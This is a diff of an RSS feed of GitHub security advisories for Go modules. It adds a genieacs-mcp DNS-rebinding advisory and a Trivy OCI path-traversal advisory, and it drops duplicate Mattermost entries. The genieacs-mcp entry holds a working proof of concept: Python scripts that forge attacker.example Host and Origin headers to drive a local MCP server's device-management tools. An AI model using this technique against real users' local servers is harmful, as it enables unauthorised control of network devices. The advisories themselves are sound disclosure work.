@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-08-25T17:21:34.028Z</updated>
+    <updated>2026-08-25T18:21:58.403Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,345 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/geiserx/genieacs-mcp] genieacs-mcp: DNS rebinding reaches local GenieACS MCP Streamable HTTP transport]]></title>
+        <id>https://github.com/advisories/GHSA-cmwv-wf9p-p8wx</id>
+        <link href="https://github.com/advisories/GHSA-cmwv-wf9p-p8wx"/>
+        <updated>2026-08-25T18:05:32.000Z</updated>
+        <content type="html"><![CDATA[<p><code>genieacs-mcp</code> exposes a local Streamable HTTP MCP endpoint that accepts attacker-controlled <code>Host</code> and <code>Origin</code> headers. A malicious web page can use DNS rebinding to route browser requests to a victim's loopback MCP listener while preserving the attacker origin. The server accepts the request, initializes an MCP session, lists GenieACS tools, and can invoke tools against the configured GenieACS NBI without a browser-supplied secret.</p>
+<p>The affected package is <code>genieacs-mcp</code> version <code>0.3.1</code> at commit <code>4d7d3c74740efb7f3833aadc8a8e9177650eb462</code>.</p>
+<p>The vulnerable transport setup is in <code>cmd/server/main.go</code>. When <code>TRANSPORT</code> is not <code>stdio</code>, the server creates a Streamable HTTP MCP handler:</p>
+<pre><code class="language-go">// cmd/server/main.go:92
+httpSrv := server.NewStreamableHTTPServer(s)
+addr := os.Getenv("MCP_LISTEN_ADDR")
+if addr == "" {
+    addr = "127.0.0.1:8080"
+}
+authToken := os.Getenv("MCP_AUTH_TOKEN")
+if authToken == "" &amp;&amp; !isLoopbackAddr(addr) {
+    log.Fatal("MCP_AUTH_TOKEN is required when MCP_LISTEN_ADDR is not loopback")
+}
+if authToken != "" {
+    mux := http.NewServeMux()
+    mux.Handle("/mcp", bearerAuth(httpSrv, authToken))
+    log.Printf("GenieACS MCP bridge listening on %s (auth enabled)", addr)
+    if err := http.ListenAndServe(addr, mux); err != nil {
+        log.Fatalf("server error: %v", err)
+    }
+} else {
+    log.Printf("GenieACS MCP bridge listening on %s", addr)
+    if err := httpSrv.Start(addr); err != nil {
+        log.Fatalf("server error: %v", err)
+    }
+}
+</code></pre>
+<p>For the default loopback listener, <code>MCP_AUTH_TOKEN</code> is not required. The unauthenticated branch calls <code>httpSrv.Start(addr)</code> directly. There is no middleware or MCP transport configuration that validates <code>Host</code> or <code>Origin</code> before <code>/mcp</code> handles the request.</p>
+<p>The README documents loopback HTTP as the default deployment mode and says <code>MCP_AUTH_TOKEN</code> is required only when <code>MCP_LISTEN_ADDR</code> is non-loopback:</p>
+<pre><code class="language-text">TRANSPORT: empty = HTTP
+MCP_LISTEN_ADDR: 127.0.0.1:8080
+MCP_AUTH_TOKEN: empty, required when MCP_LISTEN_ADDR is non-loopback
+</code></pre>
+<p>That leaves the browser-origin boundary as the missing control. DNS rebinding is designed to reach loopback listeners from a public web page unless the local server rejects attacker-controlled <code>Host</code> and <code>Origin</code> values.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>The following reproduction uses a fake GenieACS NBI with planted CPE data. It proves that attacker-shaped browser-origin headers reach the real MCP handler and that an MCP tool call reaches the configured GenieACS backend.</p>
+<p>Start a fake GenieACS NBI:</p>
+<pre><code class="language-bash">python3 - &lt;&lt;'PY'
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+import json
+import urllib.parse
+
+DEVICE_ID = "00236A-FAKE-CPE-PWNED"
+
+class Handler(BaseHTTPRequestHandler):
+    def _json(self, value, status=200):
+        data = json.dumps(value, indent=2).encode()
+        self.send_response(status)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(data)))
+        self.end_headers()
+        self.wfile.write(data)
+
+    def do_GET(self):
+        print("FAKE_ACS_GET", self.path, dict(self.headers), flush=True)
+        parsed = urllib.parse.urlparse(self.path)
+        if parsed.path.rstrip("/") == "/devices":
+            self._json([{
+                "_id": DEVICE_ID,
+                "_tags": ["poc-owned"],
+                "Device": {
+                    "DeviceInfo": {
+                        "SoftwareVersion": {"_value": "PLANTED-FAKE-FIRMWARE-9.9.9"},
+                        "SerialNumber": {"_value": "PLUTO-FAKE-CPE-0001"}
+                    },
+                    "ManagementServer": {
+                        "URL": {"_value": "https://acs-control.example.invalid/cwmp"}
+                    }
+                }
+            }])
+            return
+        self._json({"error": "not found"}, 404)
+
+    def log_message(self, fmt, *args):
+        return
+
+ThreadingHTTPServer(("127.0.0.1", 18083), Handler).serve_forever()
+PY
+</code></pre>
+<p>In a second terminal, run the affected MCP server:</p>
+<pre><code class="language-bash">git clone https://github.com/GeiserX/genieacs-mcp.git
+cd genieacs-mcp
+git checkout 4d7d3c74740efb7f3833aadc8a8e9177650eb462
+
+GOCACHE=/tmp/genieacs_mcp_gocache \
+GOPATH=/tmp/genieacs_mcp_gopath \
+go build -o /tmp/genieacs-mcp ./cmd/server
+
+ACS_URL=http://127.0.0.1:18083 \
+MCP_LISTEN_ADDR=127.0.0.1:8083 \
+/tmp/genieacs-mcp
+</code></pre>
+<p>In a third terminal, send MCP requests with forged browser-origin headers:</p>
+<pre><code class="language-bash">python3 - &lt;&lt;'PY'
+import http.client
+import json
+
+PORT = 8083
+PROTO = "2024-11-05"
+ATTACKER_HOST = f"attacker.example:{PORT}"
+
+def parse_rpc(text):
+    text = (text or "").strip()
+    if text.startswith("{") or text.startswith("["):
+        return [json.loads(text)]
+    out = []
+    for line in text.splitlines():
+        line = line.strip()
+        if line.startswith("data:"):
+            data = line[5:].strip()
+            if data and data != "[DONE]":
+                out.append(json.loads(data))
+    return out
+
+sid = None
+
+def rpc(body):
+    global sid
+    headers = {
+        "Host": ATTACKER_HOST,
+        "Origin": "http://" + ATTACKER_HOST,
+        "Content-Type": "application/json",
+        "Accept": "application/json, text/event-stream",
+    }
+    if sid:
+        headers["Mcp-Session-Id"] = sid
+        headers["MCP-Protocol-Version"] = PROTO
+    conn = http.client.HTTPConnection("127.0.0.1", PORT, timeout=10)
+    conn.request("POST", "/mcp", json.dumps(body), headers)
+    res = conn.getresponse()
+    raw_headers = dict(res.getheaders())
+    if raw_headers.get("Mcp-Session-Id"):
+        sid = raw_headers["Mcp-Session-Id"]
+    text = res.read().decode("utf-8", "replace")
+    conn.close()
+    return res.status, parse_rpc(text), text
+
+init_status, init_msgs, init_raw = rpc({
+    "jsonrpc": "2.0",
+    "id": 1,
+    "method": "initialize",
+    "params": {
+        "protocolVersion": PROTO,
+        "capabilities": {},
+        "clientInfo": {"name": "genieacs-rebind-check", "version": "1"}
+    }
+})
+
+notify_status, _, _ = rpc({"jsonrpc": "2.0", "method": "notifications/initialized", "params": {}})
+
+tools_status, tools_msgs, tools_raw = rpc({
+    "jsonrpc": "2.0",
+    "id": 2,
+    "method": "tools/list",
+    "params": {}
+})
+
+call_status, call_msgs, call_raw = rpc({
+    "jsonrpc": "2.0",
+    "id": 3,
+    "method": "tools/call",
+    "params": {
+        "name": "get_parameter",
+        "arguments": {
+            "device_id": "00236A-FAKE-CPE-PWNED",
+            "parameter_path": "Device.DeviceInfo.SoftwareVersion,Device.ManagementServer.URL"
+        }
+    }
+})
+
+print("initialize_status", init_status)
+print("session_created", bool(sid))
+print("initialized_notification_status", notify_status)
+print("tools_list_status", tools_status)
+print(tools_raw[:1200])
+print("get_parameter_status", call_status)
+print(call_raw)
+PY
+</code></pre>
+<p>The MCP request uses attacker-controlled browser-origin headers and no <code>Authorization</code> header:</p>
+<pre><code class="language-http">POST /mcp HTTP/1.1
+Host: attacker.example:8083
+Origin: http://attacker.example:8083
+Content-Type: application/json
+Accept: application/json, text/event-stream
+
+{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"genieacs-rebind-check","version":"1"}}}
+</code></pre>
+<p>Observed output:</p>
+<pre><code class="language-text">initialize_status 200
+session_created True
+initialized_notification_status 202
+tools_list_status 200
+</code></pre>
+<p><code>tools/list</code> returns 12 tools, including:</p>
+<pre><code class="language-text">connection_request
+delete_task
+download_firmware
+get_parameter
+manage_preset
+manage_provision
+reboot_device
+refresh_parameter
+retry_task
+search_devices
+set_parameter
+tag_device
+</code></pre>
+<p>The <code>get_parameter</code> tool call reaches the fake GenieACS NBI and returns the planted marker:</p>
+<pre><code class="language-text">Cached parameter values: [
+  {
+    "_id": "00236A-FAKE-CPE-PWNED",
+    "_tags": [
+      "poc-owned"
+    ],
+    "Device": {
+      "DeviceInfo": {
+        "SoftwareVersion": {
+          "_value": "PLANTED-FAKE-FIRMWARE-9.9.9"
+        },
+        "SerialNumber": {
+          "_value": "PLUTO-FAKE-CPE-0001"
+        }
+      },
+      "ManagementServer": {
+        "URL": {
+          "_value": "https://acs-control.example.invalid/cwmp"
+        }
+      }
+    }
+  }
+]
+</code></pre>
+<p>The fake GenieACS NBI also records the backend request from the MCP server:</p>
+<pre><code class="language-text">FAKE_ACS_GET /devices/?projection=Device.DeviceInfo.SoftwareVersion%2CDevice.ManagementServer.URL&amp;query=%7B%22_id%22%3A%2200236A-FAKE-CPE-PWNED%22%7D
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>A malicious website can control a victim's local <code>genieacs-mcp</code> HTTP server when the victim runs the documented default loopback HTTP mode. The page can initialize MCP, list available tools, and invoke GenieACS operations through the server's configured <code>ACS_URL</code>.</p>
+<p>In a real deployment, this can expose or modify CPE management state through GenieACS. The exposed tools include device reboot, firmware download task creation, TR-069 parameter changes, preset and provision management, tag changes, connection requests, task deletion, and task retry. Those actions execute with the MCP server's configured GenieACS access.</p>
+<h2 id="why-this-is-a-vulnerability-not-intended-behavior">Why this is a vulnerability, not intended behavior</h2>
+<ul>
+<li>The project treats loopback HTTP as a safety boundary. The README documents <code>127.0.0.1:8080</code> as the default HTTP listen address and requires <code>MCP_AUTH_TOKEN</code> only for non-loopback listeners.</li>
+<li>DNS rebinding bypasses the loopback-only assumption unless the local HTTP server validates <code>Host</code> and <code>Origin</code>.</li>
+<li>PR #22 added bearer authentication for non-loopback listeners. It explicitly left loopback listeners unauthenticated for compatibility. That protects direct non-loopback exposure, but it does not protect the browser-origin path into a loopback listener.</li>
+<li>A local trusted MCP client is the intended caller. A public web page is not.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<p>Add Host and Origin validation before the MCP handler accepts any request. For the default loopback mode, allow only local values such as:</p>
+<pre><code class="language-text">Host: 127.0.0.1:8080
+Host: localhost:8080
+Origin: http://127.0.0.1:8080
+Origin: http://localhost:8080
+</code></pre>
+<p>Reject unexpected <code>Host</code> or <code>Origin</code> values before MCP initialization. Treat absent or non-local <code>Origin</code> on browser-reachable requests as suspicious unless the request is authenticated.</p>
+<p>Also require a bearer token for HTTP transport even on loopback, or make <code>stdio</code> the default transport and require an explicit opt-in for unauthenticated loopback HTTP.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/GeiserX/genieacs-mcp/security/advisories/GHSA-cmwv-wf9p-p8wx">https://github.com/GeiserX/genieacs-mcp/security/advisories/GHSA-cmwv-wf9p-p8wx</a></li>
+<li><a href="https://github.com/GeiserX/genieacs-mcp/pull/26">https://github.com/GeiserX/genieacs-mcp/pull/26</a></li>
+<li><a href="https://github.com/GeiserX/genieacs-mcp/commit/577306d78190622eee97e362b042a69499ef373f">https://github.com/GeiserX/genieacs-mcp/commit/577306d78190622eee97e362b042a69499ef373f</a></li>
+<li><a href="https://github.com/GeiserX/genieacs-mcp/releases/tag/v0.3.2">https://github.com/GeiserX/genieacs-mcp/releases/tag/v0.3.2</a></li>
+<li><a href="https://github.com/advisories/GHSA-cmwv-wf9p-p8wx">https://github.com/advisories/GHSA-cmwv-wf9p-p8wx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cmwv-wf9p-p8wx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T18:05:28.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/aquasecurity/trivy] Trivy has a path traversal via a crafted vulnerability database or other downloaded artifacts]]></title>
+        <id>https://github.com/advisories/GHSA-mcj4-mphf-j9ff</id>
+        <link href="https://github.com/advisories/GHSA-mcj4-mphf-j9ff"/>
+        <updated>2026-08-25T17:33:03.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When Trivy downloads an OCI artifact, it uses the <code>org.opencontainers.image.title</code> annotation from the artifact manifest as the destination filename without validation. An attacker who can make Trivy fetch an attacker-controlled artifact can supply a crafted annotation that resolves to a path outside the intended destination, causing Trivy to write the layer content to an arbitrary location on the host filesystem.</p>
+<h2 id="affected-configurations">Affected configurations</h2>
+<p>Exploitation requires the attacker to direct Trivy at an attacker-controlled OCI artifact via one of the following inputs:</p>
+<table>
+<thead>
+<tr>
+<th>Input</th>
+<th>Used for</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--db-repository</code> flag, <code>TRIVY_DB_REPOSITORY</code> environment variable, or <code>db.repository</code> in <code>trivy.yaml</code></td>
+<td>Vulnerability database</td>
+</tr>
+<tr>
+<td><code>--java-db-repository</code> flag, <code>TRIVY_JAVA_DB_REPOSITORY</code> environment variable, or <code>db.java-repository</code> in <code>trivy.yaml</code></td>
+<td>Java vulnerability database</td>
+</tr>
+<tr>
+<td><code>--checks-bundle-repository</code> flag (and the deprecated <code>--policy-bundle-repository</code> alias), <code>TRIVY_CHECKS_BUNDLE_REPOSITORY</code> environment variable, or <code>misconfiguration.checks-bundle-repository</code> in <code>trivy.yaml</code></td>
+<td>Misconfiguration checks bundle</td>
+</tr>
+<tr>
+<td>Repository argument to <code>trivy module install &lt;REPO&gt;</code></td>
+<td>WASM module installation</td>
+</tr>
+</tbody></table>
+<p>Realistic scenarios in which an attacker may influence these inputs include a copy-pasted command or documentation snippet pointing to an untrusted mirror, or a third-party mirror that turns out to be hostile.</p>
+<p>Trivy's default configuration, which downloads these artifacts from Aqua-operated repositories, is not affected. The risk applies only when one of the inputs above is overridden to download a different artifact.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker who satisfies the conditions above can overwrite or create arbitrary files on the host filesystem within the privilege boundary of the user running Trivy. The vulnerability does not grant any privileges beyond what that user already has.</p>
+<p>The practical impact depends on the deployment. In environments where the running user can overwrite files such as SSH <code>authorized_keys</code>, shell startup files, cron entries, or binaries on <code>PATH</code>, the file write may be leveraged to achieve code execution as that user. In more restricted deployments, the impact is bounded to the user's writable scope but may still allow tampering with scan results, build artifacts, or other files consumed by subsequent steps in the same pipeline.</p>
+<h2 id="patches">Patches</h2>
+<p>Fixed in Trivy <code>0.71.1</code>. Users should upgrade to that release or later.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>If upgrading is not immediately possible, do not download Trivy artifacts (vulnerability database, Java database, misconfiguration checks bundle, modules, etc.) from OCI repositories you do not operate or trust.</p>
+<h2 id="credits">Credits</h2>
+<p>Reported by @ikkebr.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/aquasecurity/trivy/security/advisories/GHSA-mcj4-mphf-j9ff">https://github.com/aquasecurity/trivy/security/advisories/GHSA-mcj4-mphf-j9ff</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-55092">https://nvd.nist.gov/vuln/detail/CVE-2026-55092</a></li>
+<li><a href="https://github.com/aquasecurity/trivy/commit/39e0b132260c60d59fa746c3f6dd10374b0ff6e4">https://github.com/aquasecurity/trivy/commit/39e0b132260c60d59fa746c3f6dd10374b0ff6e4</a></li>
+<li><a href="https://github.com/aquasecurity/trivy/commit/a72d9a4d997c25fbb6534e231b4e206c9b202b31">https://github.com/aquasecurity/trivy/commit/a72d9a4d997c25fbb6534e231b4e206c9b202b31</a></li>
+<li><a href="https://github.com/aquasecurity/trivy/releases/tag/v0.71.1">https://github.com/aquasecurity/trivy/releases/tag/v0.71.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-mcj4-mphf-j9ff">https://github.com/advisories/GHSA-mcj4-mphf-j9ff</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mcj4-mphf-j9ff</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-08-25T17:33:02.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/labstack/echo] Echo: Encoded slash (%2F) bypasses route-level protection and exposes static files]]></title>
         <id>https://github.com/advisories/GHSA-vfp3-v2gw-7wfq</id>
@@ -1734,76 +2073,6 @@ Content-Type: application/json
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost doesn't sanitize FileInfo.Name received from federated peers during shared channel file sync]]></title>
-        <id>https://github.com/advisories/GHSA-8qq9-cqj8-82w4</id>
-        <link href="https://github.com/advisories/GHSA-8qq9-cqj8-82w4"/>
-        <updated>2026-08-24T21:45:54.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.1, 11.5.x &lt;= 11.5.4, 10.11.x &lt;= 10.11.15, 10.11.x &lt;= 10.11.16 fail to sanitize FileInfo.Name received from federated peers during shared channel file sync, which allows an attacker who controls a federated server to write files to arbitrary locations within the target server's filestore via path traversal sequences in the filename field. Mattermost Advisory ID: MMSA-2026-00661</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6961">https://nvd.nist.gov/vuln/detail/CVE-2026-6961</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36223">https://github.com/mattermost/mattermost/pull/36223</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36251">https://github.com/mattermost/mattermost/pull/36251</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36252">https://github.com/mattermost/mattermost/pull/36252</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36253">https://github.com/mattermost/mattermost/pull/36253</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36255">https://github.com/mattermost/mattermost/pull/36255</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/61d68d2d6ee81a5919597d91c736c502d7156859">https://github.com/mattermost/mattermost/commit/61d68d2d6ee81a5919597d91c736c502d7156859</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/a0056ed68d95f64d7c4586985e7b7f16b96b3bec">https://github.com/mattermost/mattermost/commit/a0056ed68d95f64d7c4586985e7b7f16b96b3bec</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/a9f3868e1eee9ec61855cd7277f39937385efffd">https://github.com/mattermost/mattermost/commit/a9f3868e1eee9ec61855cd7277f39937385efffd</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c021eeaff8f003034ab40f82c552cc26a710a8fd">https://github.com/mattermost/mattermost/commit/c021eeaff8f003034ab40f82c552cc26a710a8fd</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c896a63dc44c2f9c081a0a15bfddc4e6eb50e753">https://github.com/mattermost/mattermost/commit/c896a63dc44c2f9c081a0a15bfddc4e6eb50e753</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v10.11.16">https://github.com/mattermost/mattermost/releases/tag/v10.11.16</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.5.5">https://github.com/mattermost/mattermost/releases/tag/v11.5.5</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.6.2">https://github.com/mattermost/mattermost/releases/tag/v11.6.2</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.7.0">https://github.com/mattermost/mattermost/releases/tag/v11.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-8qq9-cqj8-82w4">https://github.com/advisories/GHSA-8qq9-cqj8-82w4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8qq9-cqj8-82w4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-12T18:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost doesn't sanitize FileInfo.Name received from federated peers during shared channel file sync]]></title>
-        <id>https://github.com/advisories/GHSA-8qq9-cqj8-82w4</id>
-        <link href="https://github.com/advisories/GHSA-8qq9-cqj8-82w4"/>
-        <updated>2026-08-24T21:45:54.000Z</updated>
-        <content type="html"><![CDATA[<p>Mattermost versions 11.6.x &lt;= 11.6.1, 11.5.x &lt;= 11.5.4, 10.11.x &lt;= 10.11.15, 10.11.x &lt;= 10.11.16 fail to sanitize FileInfo.Name received from federated peers during shared channel file sync, which allows an attacker who controls a federated server to write files to arbitrary locations within the target server's filestore via path traversal sequences in the filename field. Mattermost Advisory ID: MMSA-2026-00661</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6961">https://nvd.nist.gov/vuln/detail/CVE-2026-6961</a></li>
-<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36223">https://github.com/mattermost/mattermost/pull/36223</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36251">https://github.com/mattermost/mattermost/pull/36251</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36252">https://github.com/mattermost/mattermost/pull/36252</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36253">https://github.com/mattermost/mattermost/pull/36253</a></li>
-<li><a href="https://github.com/mattermost/mattermost/pull/36255">https://github.com/mattermost/mattermost/pull/36255</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/61d68d2d6ee81a5919597d91c736c502d7156859">https://github.com/mattermost/mattermost/commit/61d68d2d6ee81a5919597d91c736c502d7156859</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/a0056ed68d95f64d7c4586985e7b7f16b96b3bec">https://github.com/mattermost/mattermost/commit/a0056ed68d95f64d7c4586985e7b7f16b96b3bec</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/a9f3868e1eee9ec61855cd7277f39937385efffd">https://github.com/mattermost/mattermost/commit/a9f3868e1eee9ec61855cd7277f39937385efffd</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c021eeaff8f003034ab40f82c552cc26a710a8fd">https://github.com/mattermost/mattermost/commit/c021eeaff8f003034ab40f82c552cc26a710a8fd</a></li>
-<li><a href="https://github.com/mattermost/mattermost/commit/c896a63dc44c2f9c081a0a15bfddc4e6eb50e753">https://github.com/mattermost/mattermost/commit/c896a63dc44c2f9c081a0a15bfddc4e6eb50e753</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v10.11.16">https://github.com/mattermost/mattermost/releases/tag/v10.11.16</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.5.5">https://github.com/mattermost/mattermost/releases/tag/v11.5.5</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.6.2">https://github.com/mattermost/mattermost/releases/tag/v11.6.2</a></li>
-<li><a href="https://github.com/mattermost/mattermost/releases/tag/v11.7.0">https://github.com/mattermost/mattermost/releases/tag/v11.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-8qq9-cqj8-82w4">https://github.com/advisories/GHSA-8qq9-cqj8-82w4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8qq9-cqj8-82w4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-12T18:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost doesn't sanitize FileInfo.Name received from federated peers during shared channel file sync]]></title>
         <id>https://github.com/advisories/GHSA-8qq9-cqj8-82w4</id>
         <link href="https://github.com/advisories/GHSA-8qq9-cqj8-82w4"/>
         <updated>2026-08-24T21:45:54.000Z</updated>
